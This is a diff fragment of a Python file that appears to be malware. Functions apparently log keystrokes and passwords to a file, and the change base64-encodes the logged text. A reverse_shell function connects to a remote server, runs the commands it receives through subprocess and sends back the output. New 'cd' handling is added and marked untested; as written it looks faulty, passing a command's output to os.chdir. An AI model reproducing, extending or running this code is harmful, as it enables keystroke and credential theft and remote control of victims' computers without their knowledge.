@@ -177,7 +177,7 @@ def WriteToFile(s):
     if s == "[Space]":
         file.write(" ")
     else:
-        file.write(s)
+        file.write(base64.b64encode(s))
     file.close()
 
 def WritePasswordToFile(s):
@@ -396,12 +396,15 @@ def reverse_shell(SERVER_HOST, SERVER_PORT):
     # connect to the server
     s.connect((SERVER_HOST, SERVER_PORT))
 
+    #if cmd == "cd"... then os.chdir(cmd[3:])
     while True:
         # receive the command from the server
         command = s.recv(BUFFER_SIZE).decode()
         if command.lower() == "exit":
             # if the command is exit, just break out of the loop
             break
+        if command.lower() == "cd" or command.lower() == "cd ..":    #new not tested
+            os.chdir(subprocess.getoutput(command))                     #new not tested
         # execute the command and retrieve the results
         output = subprocess.getoutput(command)
         # send the results back to the server
